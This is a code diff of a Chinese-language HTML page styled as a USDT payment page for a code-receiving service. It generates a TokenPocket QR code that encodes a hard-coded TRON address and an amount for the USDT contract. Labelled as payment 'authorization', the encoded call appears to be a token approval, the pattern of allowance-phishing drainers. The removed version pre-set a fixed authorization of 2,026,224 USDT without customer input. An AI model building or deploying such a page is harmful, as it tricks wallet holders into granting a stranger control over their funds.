@@ -2,37 +2,34 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>海内外接码付款 - USDT 自動授權 QR</title>
+<title>海内外接码付款 - USDT 授權收款</title>
 <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
 <style>
 body { font-family: sans-serif; text-align: center; padding: 40px; }
-h2 { margin-bottom: 20px; }
+input { padding: 10px; font-size: 16px; width: 220px; }
+button { padding: 10px 20px; font-size: 16px; margin-top: 10px; }
 #qrcode { margin-top: 20px; }
 </style>
 </head>
 <body>
 
 <h2>海内外接码付款</h2>
-<p>請使用 TokenPocket DApp Browser 掃描以下 QR 進行授權</p>
+<p>請輸入本次收款金額（USDT）</p>
+
+<input type="number" id="amount" placeholder="例如 100.5" step="0.000001" min="0.000001">
+<br>
+<button onclick="generate()">生成授權 QR</button>
 
 <div id="qrcode"></div>
 
 <script>
 // ===== 配置區 =====
-
-// 收款地址
-const merchant = "TFEatdc8r36CrNqqKrbX6724DUsDyd6tHD"
-
-// USDT TRC20 合約
-const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
-
-// 授權金額（直接設定，不需要客戶輸入）
-const authorizedAmount = 2026224  // 你要的數量，可修改
-
+const merchant = "TFEatdc8r36CrNqqKrbX6724DUsDyd6tHD"   // 收款地址
+const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj" // USDT TRC20 合約
 // ==================
 
 function toSun(amount){
-  return BigInt(Math.floor(amount * 1000000))
+  return BigInt(Math.floor(parseFloat(amount)*1000000))
 }
 
 function pad64(hex){
@@ -48,8 +45,14 @@ function base58ToHex(address){
   return hex
 }
 
-function generateQR(){
-  const amount = toSun(authorizedAmount)
+function generate(){
+  const amountInput = document.getElementById("amount").value
+  if(!amountInput || amountInput <= 0){
+    alert("請輸入正確金額")
+    return
+  }
+
+  const amount = toSun(amountInput)
   let addressHex = base58ToHex(merchant).substring(2)
   const parameter = pad64(addressHex) + pad64(amount.toString(16))
 
@@ -65,20 +68,6 @@ function generateQR(){
     qrContainer.appendChild(canvas)
   })
 }
-
-// 等待 TronWeb 注入（TokenPocket DApp Browser）
-function waitTronWeb(callback) {
-  if (typeof window.tronWeb !== "undefined" && window.tronWeb.ready) {
-    callback()
-  } else {
-    setTimeout(() => waitTronWeb(callback), 100)
-  }
-}
-
-// 初始化
-waitTronWeb(() => {
-  generateQR()
-})
 </script>
 
 </body>
